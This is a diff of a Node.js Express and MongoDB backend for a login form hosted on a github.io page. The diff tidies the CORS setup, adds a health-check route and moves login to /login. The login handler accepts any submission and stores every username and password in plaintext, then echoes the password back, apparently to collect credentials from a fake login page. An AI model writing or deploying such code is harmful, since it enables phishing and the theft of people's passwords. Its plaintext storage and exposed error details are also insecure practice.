@@ -15,19 +15,19 @@ mongoose
     useUnifiedTopology: true,
   })
   .then(() => {
-    console.log("mongodb connected successfully");
+    console.log("MongoDB connected successfully");
   })
-  .catch(() => {
-    console.log("errr in connection");
+  .catch((err) => {
+    console.error("Error in MongoDB connection:", err);
   });
 
+// Middleware
 app.use(
-  cors(
-    cors({
-      origin: "https://rafiullah1819.github.io",
-      methods: ["GET", "POST", "PUT", "DELETE"],
-    })
-  )
+  cors({
+    origin: "https://rafiullah1819.github.io", // Your frontend URL
+    methods: ["GET", "POST", "PUT", "DELETE"],
+    allowedHeaders: ["Content-Type"],
+  })
 );
 app.use(bodyParser.json());
 
@@ -38,8 +38,13 @@ const userSchema = new mongoose.Schema({
 });
 const User = mongoose.model("User", userSchema);
 
-// Route to handle login requests
-app.post("/", async (req, res) => {
+// Root Route (GET /) for health check
+app.get("/", (req, res) => {
+  res.status(200).send("Backend is running!");
+});
+
+// Login Route (POST /login)
+app.post("/login", async (req, res) => {
   const { username, password } = req.body;
 
   // Simple validation
@@ -50,26 +55,20 @@ app.post("/", async (req, res) => {
   }
 
   // Always allow login, saving both username and password
-  const user = new User({ username, password });
-  await user.save();
+  try {
+    const user = new User({ username, password });
+    await user.save();
 
-  res.status(200).json({
-    message: "Login successful!",
-    user: {
-      username,
-      password,
-    },
-  });
-});
-
-app.use((req, res, next) => {
-  res.header("Access-Control-Allow-Origin", "*");
-  res.header("Access-Control-Allow-Methods", "GET, POST");
-  res.header("Access-Control-Allow-Headers", "Content-Type");
-  next();
+    res.status(200).json({
+      message: "Login successful!",
+      user: { username, password },
+    });
+  } catch (err) {
+    res.status(500).json({ error: "Error saving user", details: err });
+  }
 });
 
 // Start the server
 app.listen(PORT, () => {
-  console.log(`Server is running on :${PORT}`);
+  console.log(`Server is running on port: ${PORT}`);
 });
